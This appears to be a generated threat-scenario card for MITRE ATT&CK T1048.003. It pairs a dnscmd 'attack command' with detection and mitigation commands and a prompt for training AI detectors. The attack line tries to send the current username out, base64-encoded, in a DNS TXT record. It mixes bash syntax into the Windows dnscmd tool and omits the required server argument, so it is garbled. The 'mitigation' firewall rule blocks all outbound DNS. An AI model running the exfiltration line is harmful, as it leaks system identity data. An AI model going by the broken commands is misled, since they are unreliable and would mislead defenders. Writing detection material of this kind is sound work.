---
type: campaign
scenario_id: 357
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using dnscmd to create DNS TXT record for data exfiltration.

## Threat Description
Using dnscmd to create DNS TXT record for data exfiltration.

## Attack Command
```
dnscmd /RecordAdd $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) TXT $(echo $(whoami) | base64 -w0)
```

## Detection Logic
Monitor dnscmd: `wmic process where name='dnscmd.exe' get commandline | findstr RecordAdd`; DNS TXT anomalies: `tshark -Y 'dns.qry.type == 16'`.

## Mitigation
Restrict dnscmd: `icacls %windir%\System32\dnscmd.exe /deny Everyone:RX`; Enforce DNS monitoring: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect dnscmd-based DNS exfiltration by analyzing TXT record creation, base64-encoded data, and DNS query spikes; suggest DNS monitoring rules.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
